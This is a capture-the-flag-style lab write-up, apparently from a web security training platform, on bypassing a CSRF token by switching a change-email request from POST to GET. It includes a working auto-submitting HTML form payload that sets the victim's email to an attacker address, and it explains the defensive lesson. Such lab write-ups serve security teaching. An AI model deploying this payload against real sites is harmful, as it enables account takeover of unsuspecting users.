# Lab 2: CSRF where token validation depends on request method

**Difficulty:** Practitioner

## Goal

Change the victim's email with a CSRF attack. The change-email request carries a CSRF token, but the server only validates it for some HTTP methods.

## Exploit

Send the request as a **GET** instead of a POST. The server skips the token check for GET, so no valid token is needed.

```html
<form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="GET">
  <input type="hidden" name="email" value="attacker@evil.com" />
</form>
<script>document.forms[0].submit();</script>
```

Store on the exploit server and deliver to the victim.

## Why it works

The app validates the CSRF token on POST but not on GET. Converting the request to GET moves the parameters into the query string and lands on a code path that never checks the token.

## Gotcha: GET forms rebuild the query string

A `method="GET"` form discards any query string in the `action` URL and rebuilds it from the form's input fields. Putting `?email=...` directly in the `action` does not work - the browser strips it. The `email` value must be an actual `<input>` so the browser serializes it into the query string.

## Takeaway

A CSRF defense must apply to every method that can perform the action. Enforcing the token only on POST leaves the same action reachable, unprotected, over GET.

## Note on automation

Browser/exploit-server driven. The lab-01 solve.py pattern (drive the exploit server store + deliver API) applies here too - swap the form method to GET.
